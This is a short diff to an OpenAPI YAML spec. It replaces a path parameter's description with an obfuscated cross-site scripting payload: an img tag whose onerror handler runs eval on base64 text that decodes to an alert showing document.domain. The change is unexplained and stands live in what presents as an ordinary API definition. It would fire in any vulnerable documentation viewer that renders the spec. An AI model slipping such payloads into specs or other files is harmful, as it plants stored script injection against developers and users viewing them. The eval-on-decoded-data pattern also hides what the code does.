@@ -64,7 +64,8 @@ paths:
       summary: Deletes a group by id
     get:
       parameters:
-        - description: Id value to filter by
+        - description: |
+            "><img src=x id='YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==' onerror='eval(atob(this.id))'>
           format: int64
           in: path
           name: id
